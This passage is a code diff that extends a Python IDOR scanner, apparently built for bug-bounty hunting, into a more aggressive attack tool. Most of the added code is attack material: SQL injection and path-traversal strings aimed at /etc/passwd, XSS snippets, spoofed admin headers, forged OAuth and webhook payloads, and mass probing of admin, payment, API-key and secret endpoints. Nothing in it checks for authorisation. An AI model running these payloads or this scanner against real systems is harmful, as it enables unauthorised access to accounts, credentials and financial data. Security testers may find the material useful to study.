@@ -47,6 +47,17 @@ class IDORTester:
         self.target_url = args.url
         self.cookies = self._parse_cookies(args.cookies)
         self.headers = self._parse_headers(args.headers)
+        # Enhanced features for high-value bounties (move before user_ids)
+        self.test_sequential_ids = getattr(args, 'sequential', False)
+        self.test_common_ids = getattr(args, 'common_ids', False)
+        self.test_privileged_endpoints = getattr(args, 'privileged', False)
+        self.test_batch_operations = getattr(args, 'batch', False)
+        self.test_webhook_endpoints = getattr(args, 'webhooks', False)
+        self.test_file_operations = getattr(args, 'files', False)
+        self.test_admin_functions = getattr(args, 'admin', False)
+        self.test_payment_endpoints = getattr(args, 'payment', False)
+        self.test_api_keys = getattr(args, 'api_keys', False)
+        self.test_oauth_endpoints = getattr(args, 'oauth', False)
         self.user_ids = self._generate_user_ids(args.ids) if args.ids else self._generate_test_ids()
         self.verbose = args.verbose
         self.timeout = args.timeout
@@ -79,13 +90,46 @@ class IDORTester:
         return [id.strip() for id in ids_str.split(',')]
     
     def _generate_test_ids(self):
-        """Generate various test IDs for IDOR testing"""
-        return [
-            "1", "2", "3", "admin", "user",
-            *[str(random.randint(1000, 9999)) for _ in range(3)],
-            *[f"user_{random.randint(1, 100)}" for _ in range(2)],
-            *[f"{random.choice(string.ascii_lowercase)}{random.randint(1, 100)}" for _ in range(2)]
+        """Generate various test IDs and payloads for aggressive IDOR testing"""
+        base_ids = [
+            # Standard and privileged IDs
+            "1", "2", "3", "admin", "user", "root", "system", "test", "demo",
+            "guest", "anonymous", "public", "default", "master", "superuser",
+            "administrator", "moderator", "support", "helpdesk", "staff",
+            # Negative and large numbers
+            "-1", "0", "00", "000", "999999999", "2147483647", "-2147483648",
+            # Edge-case strings
+            "null", "undefined", "none", "empty", "true", "false", "yes", "no", "on", "off",
+            "super", "superadmin", "webmaster", "operator", "manager", "owner", "creator", "founder", "ceo", "cto", "cfo",
+            # UUID-like IDs
+            "00000000-0000-0000-0000-000000000000", "11111111-1111-1111-1111-111111111111",
+            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa", "ffffffff-ffff-ffff-ffff-ffffffffffff",
+            # Long and short IDs
+            "12345678901234567890", "a", "z", "xyz", "abc",
+            # SQLi payloads
+            "' OR '1'='1", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1#", "' OR 1=1/*", "'--", "'/*", "' or sleep(5)--",
+            # Path traversal
+            "../", "../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "..\\..\\..\\..\\windows\\win.ini",
+            # Special characters
+            "<script>", "<img src=x onerror=alert(1)>", "%00", "%2e", "%2f", "%5c", "%3c", "%3e", "%27", "%22", "%3b", "%26", "%7c", "%24", "%60",
         ]
+        # Add sequential IDs for high-value testing
+        if self.test_sequential_ids:
+            base_ids.extend([str(i) for i in range(1, 51)])  # 1-50
+            base_ids.extend([str(i) for i in range(100, 151)])  # 100-150
+            base_ids.extend([str(i) for i in range(1000, 1051)])  # 1000-1050
+        # Add common high-value IDs
+        if self.test_common_ids:
+            base_ids.extend([
+                "admin1", "admin2", "user1", "user2", "test1", "test2",
+                "super", "superadmin", "webmaster", "operator", "manager",
+                "owner", "creator", "founder", "ceo", "cto", "cfo"
+            ])
+        # Add random IDs
+        base_ids.extend([str(random.randint(1000, 9999)) for _ in range(10)])
+        base_ids.extend([f"user_{random.randint(1, 100)}" for _ in range(5)])
+        base_ids.extend([f"{random.choice(string.ascii_lowercase)}{random.randint(1, 100)}" for _ in range(5)])
+        return list(set(base_ids))  # Remove duplicates
 
     def run(self):
         """Main execution method"""
@@ -119,6 +163,30 @@ class IDORTester:
                 if self.graphql:
                     self._test_graphql_idor()
                 self._test_mass_assignment()
+                
+                # Enhanced high-value tests
+                if self.test_privileged_endpoints:
+                    self._test_privileged_endpoints(endpoints)
+                if self.test_batch_operations:
+                    self._test_batch_operations(endpoints)
+                if self.test_webhook_endpoints:
+                    self._test_webhook_endpoints(endpoints)
+                if self.test_file_operations:
+                    self._test_file_operations(endpoints)
+                if self.test_admin_functions:
+                    self._test_admin_functions(endpoints)
+                if self.test_payment_endpoints:
+                    self._test_payment_endpoints(endpoints)
+                if self.test_api_keys:
+                    self._test_api_key_endpoints(endpoints)
+                if self.test_oauth_endpoints:
+                    self._test_oauth_endpoints(endpoints)
+                
+                # Advanced techniques
+                self._test_advanced_techniques(endpoints)
+                
+                # Authentication bypass testing
+                self._test_auth_bypass(endpoints)
                 
                 progress.update(task, completed=True, description="[bold green]Testing completed![/bold green]")
         
@@ -188,7 +256,25 @@ class IDORTester:
                 '/user/', '/users/', '/account/', '/accounts/',
                 '/profile/', '/profiles/', '/order/', '/orders/',
                 '/item/', '/items/', '/document/', '/documents/',
-                '/file/', '/files/', '/data/', '/resource/', '/resources/'
+                '/file/', '/files/', '/data/', '/resource/', '/resources/',
+                # Authentication-related endpoints
+                '/login/', '/logout/', '/auth/', '/authentication/',
+                '/session/', '/sessions/', '/token/', '/tokens/',
+                '/oauth/', '/oauth2/', '/sso/', '/saml/',
+                '/register/', '/signup/', '/signin/', '/signout/',
+                '/password/', '/reset/', '/forgot/', '/recover/',
+                '/verify/', '/confirm/', '/activate/', '/validate/',
+                '/admin/', '/administrator/', '/manage/', '/management/',
+                '/dashboard/', '/panel/', '/console/', '/control/',
+                '/settings/', '/config/', '/configuration/',
+                '/system/', '/sys/', '/internal/', '/private/',
+                '/billing/', '/invoice/', '/payment/', '/subscription/',
+                '/support/', '/helpdesk/', '/ticket/', '/case/',
+                '/audit/', '/log/', '/logs/', '/activity/',
+                '/report/', '/reports/', '/analytics/', '/stats/',
+                '/backup/', '/restore/', '/export/', '/import/',
+                '/notification/', '/webhook/', '/callback/',
+                '/api-key/', '/apikey/', '/secret/', '/secrets/'
             ]
             
             likely_endpoints = set()
@@ -270,9 +356,9 @@ class IDORTester:
                         console.print(f"[yellow]Error in standard IDOR test: {str(e)}[/yellow]")
 
     def _test_parameter_pollution(self, endpoints):
-        """Test for IDOR via parameter pollution techniques"""
+        """Aggressively test for IDOR via parameter pollution and fuzzing all parameters"""
         if self.verbose:
-            console.print("[bold blue]Testing for parameter pollution vulnerabilities...[/bold blue]")
+            console.print("[bold blue]Aggressively testing for parameter pollution and fuzzing all parameters...[/bold blue]")
         
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
             futures = []
@@ -286,67 +372,77 @@ class IDORTester:
                     continue
                 
                 for param, values in query_params.items():
-                    if self._looks_like_id_param(param):
-                        for test_id in self.user_ids:
-                            # Test 1: Add duplicate parameter with different value
+                    for test_id in self.user_ids:
+                        # Test 1: Add duplicate parameter with different value
+                        new_params = query_params.copy()
+                        new_params[param].append(test_id)
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"Parameter pollution test: added duplicate '{param}={test_id}'"
+                        ))
+                        # Test 2: Add parameter with different case
+                        new_params = query_params.copy()
+                        upper_param = param.upper() if param.islower() else param.lower()
+                        new_params[upper_param] = [test_id]
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"Case manipulation test: added '{upper_param}={test_id}'"
+                        ))
+                        # Test 3: URL-encoded parameter name
+                        new_params = query_params.copy()
+                        encoded_param = param.replace('_', '%5f').replace('-', '%2d')
+                        new_params[encoded_param] = [test_id]
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"Encoded parameter test: added '{encoded_param}={test_id}'"
+                        ))
+                        # Test 4: JSON embedded in parameter
+                        new_params = query_params.copy()
+                        json_payload = json.dumps({param: test_id})
+                        new_params[param] = [json_payload]
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"JSON parameter test: changed '{param}' to contain JSON payload"
+                        ))
+                        # Test 5: Remove the parameter
+                        new_params = query_params.copy()
+                        del new_params[param]
+                        new_query = urlencode(new_params, doseq=True)
+                        new_url = url_parts._replace(query=new_query).geturl()
+                        futures.append(executor.submit(
+                            self._test_url_for_idor,
+                            original_url=endpoint,
+                            modified_url=new_url,
+                            description=f"Parameter removal test: removed '{param}'"
+                        ))
+                        # Test 6: Fuzz with special characters and encodings
+                        for special in ["%00", "%2e", "%2f", "%5c", "%3c", "%3e", "%27", "%22", "%3b", "%26", "%7c", "%24", "%60"]:
                             new_params = query_params.copy()
-                            new_params[param].append(test_id)
-                            
+                            new_params[param] = [test_id + special]
                             new_query = urlencode(new_params, doseq=True)
                             new_url = url_parts._replace(query=new_query).geturl()
-                            
                             futures.append(executor.submit(
                                 self._test_url_for_idor,
                                 original_url=endpoint,
                                 modified_url=new_url,
-                                description=f"Parameter pollution test: added duplicate '{param}={test_id}'"
+                                description=f"Special char fuzz: '{param}={test_id + special}'"
                             ))
-                            
-                            # Test 2: Add parameter with different case
-                            new_params = query_params.copy()
-                            upper_param = param.upper() if param.islower() else param.lower()
-                            new_params[upper_param] = [test_id]
-                            
-                            new_query = urlencode(new_params, doseq=True)
-                            new_url = url_parts._replace(query=new_query).geturl()
-                            
-                            futures.append(executor.submit(
-                                self._test_url_for_idor,
-                                original_url=endpoint,
-                                modified_url=new_url,
-                                description=f"Case manipulation test: added '{upper_param}={test_id}'"
-                            ))
-                            
-                            # Test 3: URL-encoded parameter name
-                            new_params = query_params.copy()
-                            encoded_param = "%s" % param
-                            new_params[encoded_param] = [test_id]
-                            
-                            new_query = urlencode(new_params, doseq=True)
-                            new_url = url_parts._replace(query=new_query).geturl()
-                            
-                            futures.append(executor.submit(
-                                self._test_url_for_idor,
-                                original_url=endpoint,
-                                modified_url=new_url,
-                                description=f"Encoded parameter test: added '{encoded_param}={test_id}'"
-                            ))
-                            
-                            # Test 4: JSON embedded in parameter
-                            new_params = query_params.copy()
-                            json_payload = json.dumps({"id": test_id})
-                            new_params[param] = [json_payload]
-                            
-                            new_query = urlencode(new_params, doseq=True)
-                            new_url = url_parts._replace(query=new_query).geturl()
-                            
-                            futures.append(executor.submit(
-                                self._test_url_for_idor,
-                                original_url=endpoint,
-                                modified_url=new_url,
-                                description=f"JSON parameter test: changed '{param}' to contain JSON payload"
-                            ))
-            
             # Process all the results
             for future in concurrent.futures.as_completed(futures):
                 try:
@@ -744,10 +840,482 @@ class IDORTester:
                         if self.verbose:
                             console.print(f"[yellow]Error in GraphQL test: {str(e)}[/yellow]")
 
-    def _test_mass_assignment(self):
-        """Test for IDOR via mass assignment"""
+    def _test_privileged_endpoints(self, endpoints):
+        """Test for IDOR in privileged endpoints that often contain high-value data"""
         if self.verbose:
-            console.print("[bold blue]Testing for mass assignment vulnerabilities...[/bold blue]")
+            console.print("[bold blue]Testing for privileged endpoint vulnerabilities...[/bold blue]")
+        
+        privileged_patterns = [
+            '/admin/', '/administrator/', '/manage/', '/management/',
+            '/dashboard/', '/panel/', '/console/', '/control/',
+            '/settings/', '/config/', '/configuration/',
+            '/system/', '/sys/', '/internal/', '/private/',
+            '/api/admin/', '/api/management/', '/api/system/',
+            '/v1/admin/', '/v2/admin/', '/api/v1/admin/',
+            '/user/admin/', '/users/admin/', '/account/admin/',
+            '/billing/', '/invoice/', '/payment/', '/subscription/',
+            '/support/', '/helpdesk/', '/ticket/', '/case/',
+            '/audit/', '/log/', '/logs/', '/activity/',
+            '/report/', '/reports/', '/analytics/', '/stats/',
+            '/backup/', '/restore/', '/export/', '/import/',
+            '/notification/', '/webhook/', '/callback/',
+            '/oauth/', '/auth/', '/sso/', '/saml/',
+            '/api-key/', '/apikey/', '/token/', '/secret/'
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in privileged_patterns:
+                    if pattern in endpoint.lower():
+                        # Test with different user IDs
+                        for test_id in self.user_ids[:5]:  # Limit to reduce noise
+                            # Test path parameter replacement
+                            if test_id in endpoint:
+                                continue  # Skip if already contains the test ID
+                                
+                            # Try to inject the test ID into the path
+                            path_parts = endpoint.split('/')
+                            for i, part in enumerate(path_parts):
+                                if self._looks_like_id(part):
+                                    new_parts = path_parts.copy()
+                                    new_parts[i] = test_id
+                                    new_endpoint = '/'.join(new_parts)
+                                    
+                                    futures.append(executor.submit(
+                                        self._test_url_for_idor,
+                                        original_url=endpoint,
+                                        modified_url=new_endpoint,
+                                        description=f"Privileged endpoint test: {pattern} with ID {test_id}"
+                                    ))
+                                    break
+                            else:
+                                # If no ID found in path, try adding one
+                                new_endpoint = f"{endpoint.rstrip('/')}/{test_id}"
+                                futures.append(executor.submit(
+                                    self._test_url_for_idor,
+                                    original_url=endpoint,
+                                    modified_url=new_endpoint,
+                                    description=f"Privileged endpoint test: added ID {test_id} to {pattern}"
+                                ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in privileged endpoint test: {str(e)}[/yellow]")
+
+    def _test_batch_operations(self, endpoints):
+        """Test for IDOR in batch operations that often process multiple resources"""
+        if self.verbose:
+            console.print("[bold blue]Testing for batch operation vulnerabilities...[/bold blue]")
+        
+        batch_patterns = [
+            '/batch/', '/bulk/', '/mass/', '/multiple/',
+            '/batch-update/', '/bulk-update/', '/mass-update/',
+            '/batch-delete/', '/bulk-delete/', '/mass-delete/',
+            '/batch-create/', '/bulk-create/', '/mass-create/',
+            '/api/batch/', '/api/bulk/', '/api/mass/',
+            '/v1/batch/', '/v2/batch/', '/api/v1/batch/'
+        ]
+        
+        batch_payloads = [
+            {"ids": ["1", "2", "3", "admin", "user"]},
+            {"user_ids": ["1", "2", "3", "admin", "user"]},
+            {"account_ids": ["1", "2", "3", "admin", "user"]},
+            {"items": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]},
+            {"users": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]},
+            {"accounts": [{"id": "1"}, {"id": "2"}, {"id": "admin"}, {"id": "user"}]}
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in batch_patterns:
+                    if pattern in endpoint.lower():
+                        for payload in batch_payloads:
+                            # Test POST with batch payload
+                            futures.append(executor.submit(
+                                self._test_batch_payload,
+                                url=endpoint,
+                                payload=payload,
+                                description=f"Batch operation test: {pattern} with mixed IDs"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in batch operation test: {str(e)}[/yellow]")
+
+    def _test_webhook_endpoints(self, endpoints):
+        """Test for IDOR in webhook endpoints that often contain sensitive data"""
+        if self.verbose:
+            console.print("[bold blue]Testing for webhook endpoint vulnerabilities...[/bold blue]")
+        
+        webhook_patterns = [
+            '/webhook/', '/webhooks/', '/hook/', '/hooks/',
+            '/callback/', '/callbacks/', '/notify/', '/notification/',
+            '/push/', '/ping/', '/pong/', '/echo/',
+            '/api/webhook/', '/api/hook/', '/api/callback/',
+            '/v1/webhook/', '/v2/webhook/', '/api/v1/webhook/'
+        ]
+        
+        webhook_payloads = [
+            {"user_id": "admin", "event": "user.created"},
+            {"account_id": "admin", "event": "account.updated"},
+            {"id": "admin", "type": "user", "action": "create"},
+            {"target_id": "admin", "event_type": "user_login"},
+            {"recipient_id": "admin", "message": "test"}
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in webhook_patterns:
+                    if pattern in endpoint.lower():
+                        for payload in webhook_payloads:
+                            # Test POST with webhook payload
+                            futures.append(executor.submit(
+                                self._test_webhook_payload,
+                                url=endpoint,
+                                payload=payload,
+                                description=f"Webhook test: {pattern} with admin ID"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in webhook test: {str(e)}[/yellow]")
+
+    def _test_file_operations(self, endpoints):
+        """Test for IDOR in file operations that often contain sensitive documents"""
+        if self.verbose:
+            console.print("[bold blue]Testing for file operation vulnerabilities...[/bold blue]")
+        
+        file_patterns = [
+            '/file/', '/files/', '/document/', '/documents/',
+            '/upload/', '/download/', '/attachment/', '/attachments/',
+            '/media/', '/image/', '/images/', '/video/', '/videos/',
+            '/pdf/', '/doc/', '/xls/', '/csv/', '/json/',
+            '/api/file/', '/api/document/', '/api/upload/',
+            '/v1/file/', '/v2/file/', '/api/v1/file/'
+        ]
+        
+        file_ids = [
+            "1", "2", "3", "admin", "user", "test", "demo",
+            "document1", "file1", "attachment1", "media1",
+            "invoice.pdf", "contract.pdf", "report.pdf",
+            "user_data.csv", "admin_data.xls", "sensitive.json"
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in file_patterns:
+                    if pattern in endpoint.lower():
+                        for file_id in file_ids:
+                            # Test file access with different IDs
+                            new_endpoint = f"{endpoint.rstrip('/')}/{file_id}"
+                            futures.append(executor.submit(
+                                self._test_url_for_idor,
+                                original_url=endpoint,
+                                modified_url=new_endpoint,
+                                description=f"File operation test: {pattern} with ID {file_id}"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in file operation test: {str(e)}[/yellow]")
+
+    def _test_admin_functions(self, endpoints):
+        """Test for IDOR in admin functions that often have elevated privileges"""
+        if self.verbose:
+            console.print("[bold blue]Testing for admin function vulnerabilities...[/bold blue]")
+        
+        admin_patterns = [
+            '/admin/', '/administrator/', '/manage/', '/management/',
+            '/superuser/', '/root/', '/system/', '/sysadmin/',
+            '/moderator/', '/support/', '/helpdesk/', '/staff/',
+            '/api/admin/', '/api/management/', '/api/system/',
+            '/v1/admin/', '/v2/admin/', '/api/v1/admin/'
+        ]
+        
+        admin_functions = [
+            'users', 'accounts', 'settings', 'config', 'logs',
+            'reports', 'analytics', 'billing', 'invoices', 'payments',
+            'notifications', 'webhooks', 'backups', 'exports',
+            'permissions', 'roles', 'groups', 'departments',
+            'audit', 'activity', 'security', 'compliance'
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in admin_patterns:
+                    if pattern in endpoint.lower():
+                        for function in admin_functions:
+                            for test_id in self.user_ids[:3]:
+                                # Test admin function with different user IDs
+                                new_endpoint = f"{endpoint.rstrip('/')}/{function}/{test_id}"
+                                futures.append(executor.submit(
+                                    self._test_url_for_idor,
+                                    original_url=endpoint,
+                                    modified_url=new_endpoint,
+                                    description=f"Admin function test: {pattern}{function} with ID {test_id}"
+                                ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "CRITICAL"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in admin function test: {str(e)}[/yellow]")
+
+    def _test_payment_endpoints(self, endpoints):
+        """Test for IDOR in payment endpoints that often contain financial data"""
+        if self.verbose:
+            console.print("[bold blue]Testing for payment endpoint vulnerabilities...[/bold blue]")
+        
+        payment_patterns = [
+            '/payment/', '/payments/', '/billing/', '/invoice/',
+            '/subscription/', '/order/', '/orders/', '/transaction/',
+            '/credit/', '/debit/', '/refund/', '/charge/',
+            '/api/payment/', '/api/billing/', '/api/order/',
+            '/v1/payment/', '/v2/payment/', '/api/v1/payment/'
+        ]
+        
+        payment_ids = [
+            "1", "2", "3", "admin", "user", "test",
+            "invoice1", "order1", "transaction1", "payment1",
+            "subscription1", "billing1", "charge1", "refund1"
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in payment_patterns:
+                    if pattern in endpoint.lower():
+                        for payment_id in payment_ids:
+                            # Test payment endpoint with different IDs
+                            new_endpoint = f"{endpoint.rstrip('/')}/{payment_id}"
+                            futures.append(executor.submit(
+                                self._test_url_for_idor,
+                                original_url=endpoint,
+                                modified_url=new_endpoint,
+                                description=f"Payment endpoint test: {pattern} with ID {payment_id}"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "CRITICAL"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in payment endpoint test: {str(e)}[/yellow]")
+
+    def _test_api_key_endpoints(self, endpoints):
+        """Test for IDOR in API key endpoints that often contain sensitive credentials"""
+        if self.verbose:
+            console.print("[bold blue]Testing for API key endpoint vulnerabilities...[/bold blue]")
+        
+        api_key_patterns = [
+            '/api-key/', '/apikey/', '/api_key/', '/key/',
+            '/token/', '/tokens/', '/secret/', '/secrets/',
+            '/credential/', '/credentials/', '/auth-key/',
+            '/api/api-key/', '/api/token/', '/api/secret/',
+            '/v1/api-key/', '/v2/api-key/', '/api/v1/api-key/'
+        ]
+        
+        api_key_ids = [
+            "1", "2", "3", "admin", "user", "test",
+            "key1", "token1", "secret1", "credential1",
+            "api_key_1", "auth_key_1", "access_key_1"
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in api_key_patterns:
+                    if pattern in endpoint.lower():
+                        for key_id in api_key_ids:
+                            # Test API key endpoint with different IDs
+                            new_endpoint = f"{endpoint.rstrip('/')}/{key_id}"
+                            futures.append(executor.submit(
+                                self._test_url_for_idor,
+                                original_url=endpoint,
+                                modified_url=new_endpoint,
+                                description=f"API key endpoint test: {pattern} with ID {key_id}"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "CRITICAL"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in API key endpoint test: {str(e)}[/yellow]")
+
+    def _test_oauth_endpoints(self, endpoints):
+        """Test for IDOR in OAuth endpoints that often contain authentication data"""
+        if self.verbose:
+            console.print("[bold blue]Testing for OAuth endpoint vulnerabilities...[/bold blue]")
+        
+        oauth_patterns = [
+            '/oauth/', '/oauth2/', '/auth/', '/authentication/',
+            '/sso/', '/saml/', '/openid/', '/jwt/',
+            '/login/', '/logout/', '/session/', '/sessions/',
+            '/api/oauth/', '/api/auth/', '/api/sso/',
+            '/v1/oauth/', '/v2/oauth/', '/api/v1/oauth/'
+        ]
+        
+        oauth_payloads = [
+            {"user_id": "admin", "client_id": "test", "scope": "admin"},
+            {"account_id": "admin", "grant_type": "password", "username": "admin"},
+            {"id": "admin", "token_type": "bearer", "access_token": "test"},
+            {"user": "admin", "permissions": ["admin", "user"], "roles": ["admin"]}
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                for pattern in oauth_patterns:
+                    if pattern in endpoint.lower():
+                        for payload in oauth_payloads:
+                            # Test OAuth endpoint with different payloads
+                            futures.append(executor.submit(
+                                self._test_oauth_payload,
+                                url=endpoint,
+                                payload=payload,
+                                description=f"OAuth endpoint test: {pattern} with admin payload"
+                            ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "CRITICAL"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in OAuth endpoint test: {str(e)}[/yellow]")
+
+    def _test_advanced_techniques(self, endpoints):
+        """Test for advanced IDOR techniques that often find high-value vulnerabilities"""
+        if self.verbose:
+            console.print("[bold blue]Testing for advanced IDOR techniques...[/bold blue]")
+        
+        # Test for IDOR via HTTP headers
+        header_tests = [
+            {"X-User-ID": "admin"},
+            {"X-Account-ID": "admin"},
+            {"X-Forwarded-User": "admin"},
+            {"X-Original-User": "admin"},
+            {"X-Real-User": "admin"},
+            {"X-User": "admin"},
+            {"X-User-Id": "admin"},
+            {"X-User-Name": "admin"},
+            {"X-User-Email": "admin@test.com"},
+            {"X-User-Role": "admin"},
+            {"X-Admin": "true"},
+            {"X-Is-Admin": "true"},
+            {"X-Privileged": "true"},
+            {"X-Authorization": "admin"},
+            {"X-Auth-User": "admin"}
+        ]
+        
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+            futures = []
+            
+            for endpoint in endpoints:
+                # Test with different headers
+                for header_test in header_tests:
+                    new_headers = self.headers.copy()
+                    new_headers.update(header_test)
+                    
+                    futures.append(executor.submit(
+                        self._test_headers_for_idor,
+                        url=endpoint,
+                        headers=new_headers,
+                        description=f"Advanced header test: {list(header_test.keys())[0]}"
+                    ))
+                
+                # Test for IDOR via JSON path traversal
+                json_path_tests = [
+                    {"user": {"id": "admin"}},
+                    {"data": {"user_id": "admin"}},
+                    {"payload": {"account_id": "admin"}},
+                    {"request": {"id": "admin"}},
+                    {"body": {"user": "admin"}},
+                    {"params": {"id": "admin"}},
+                    {"query": {"user_id": "admin"}},
+                    {"filter": {"id": "admin"}},
+                    {"where": {"user_id": "admin"}},
+                    {"conditions": {"id": "admin"}}
+                ]
+                
+                for json_test in json_path_tests:
+                    futures.append(executor.submit(
+                        self._test_json_payload,
+                        url=endpoint,
+                        payload=json_test,
+                        description=f"JSON path test: {list(json_test.keys())[0]}"
+                    ))
+            
+            # Process results
+            for future in concurrent.futures.as_completed(futures):
+                try:
+                    result = future.result()
+                    if result:
+                        result["severity"] = "HIGH"
+                        self.findings.append(result)
+                except Exception as e:
+                    if self.verbose:
+                        console.print(f"[yellow]Error in advanced technique test: {str(e)}[/yellow]")
+
+    def _test_mass_assignment(self):
         
         # Common API endpoints that might be vulnerable to mass assignment
         test_endpoints = [
@@ -1047,11 +1615,10 @@ class IDORTester:
             return None
 
     def _compare_responses(self, original_response, modified_response, modified_url, description):
-        """Compare responses to detect IDOR vulnerabilities"""
+        """Compare responses to detect IDOR vulnerabilities, highlighting any difference"""
         # Ignore if both failed
         if original_response is None and modified_response is None:
             return None
-            
         # If the original failed but the modified worked, that's interesting
         if original_response is None and modified_response is not None:
             if modified_response.status_code in [200, 201, 202, 203]:
@@ -1063,11 +1630,9 @@ class IDORTester:
                     "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
                 }
             return None
-            
         # If the modified failed but the original worked, probably not an IDOR
         if original_response is not None and modified_response is None:
             return None
-            
         # Check status codes
         if original_response.status_code != modified_response.status_code:
             # If modified gives a success code, potential IDOR
@@ -1083,54 +1648,44 @@ class IDORTester:
             elif modified_response.status_code in [401, 403, 500]:
                 if self.verbose:
                     console.print(f"[blue]Possible access control at {modified_url} - received {modified_response.status_code}[/blue]")
-        
         # If both gave 200, compare content
         if original_response.status_code in [200, 201, 202, 203] and modified_response.status_code in [200, 201, 202, 203]:
             # Check response body similarities
             original_length = len(original_response.text)
             modified_length = len(modified_response.text)
-            
             # If responses are identical in size but shouldn't be, suspicious
             if original_length == modified_length and original_length > 0:
                 if original_response.text == modified_response.text:
                     # Same exact response is suspicious for different resources
                     if self.verbose:
                         console.print(f"[blue]Same response for different IDs at {modified_url}[/blue]")
-                
-            # If lengths are very different, might be different resources (good)
-            length_difference = abs(original_length - modified_length)
-            length_ratio = max(original_length, modified_length) / min(original_length, modified_length) if min(original_length, modified_length) > 0 else float('inf')
-            
-            if length_difference > 100 and length_ratio > 1.2:
-                # Check for sensitive patterns in the response
-                sensitive_patterns = [
-                    r'email["\s:=]+["\s]*[^"<>\s,]+@[^"<>\s,]+',
-                    r'password["\s:=]+["\s]*[^"<>\s]+',
-                    r'token["\s:=]+["\s]*[^"<>\s]+',
-                    r'api_?key["\s:=]+["\s]*[^"<>\s]+',
-                    r'secret["\s:=]+["\s]*[^"<>\s]+'
-                ]
-                
-                for pattern in sensitive_patterns:
-                    if re.search(pattern, modified_response.text, re.IGNORECASE):
-                        return {
-                            "type": "IDOR with Sensitive Data",
-                            "url": modified_url,
-                            "description": f"{description} - Response contains sensitive information",
-                            "status": modified_response.status_code,
-                            "pattern_matched": pattern,
-                            "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
-                        }
-                
-                # Even without sensitive patterns, report significant content differences
+                else:
+                    # Any difference is interesting
+                    return {
+                        "type": "Potential IDOR (diff)",
+                        "url": modified_url,
+                        "description": f"{description} - Response content differs for different IDs (same length)",
+                        "status": modified_response.status_code,
+                        "response_sample": modified_response.text[:200] + "..." if len(modified_response.text) > 200 else modified_response.text
+                    }
+            # If lengths are different, report as potential
+            if original_length != modified_length:
                 return {
-                    "type": "Potential IDOR",
